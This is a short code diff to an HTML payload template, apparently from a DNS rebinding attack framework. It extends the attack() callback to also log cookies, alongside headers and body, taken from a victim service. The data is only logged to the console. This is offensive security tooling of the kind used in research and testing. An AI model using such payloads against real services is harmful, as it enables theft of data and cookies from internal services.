@@ -13,13 +13,16 @@ Copy the content of this file to a new .html file and add its name to the
 		// attack() is called once DNS rebinding is successful
 		// headers and body contains server data obtained 
 		// from the victim service during rebinding, if any.
-		function attack(headers, body) {
+		function attack(headers, cookie, body) {
 			if (headers !== null) { 
 			console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
-			}
+			};
+			if (cookie !== null) { 
+			console.log(`Origin: ${window.location} headers: ${cookie}`);
+			};
 			if (body !== null) {
 			console.log(`Origin: ${window.location} body:\n${body}`);
-			}
+			};
 		}
 	</script>
 </head>
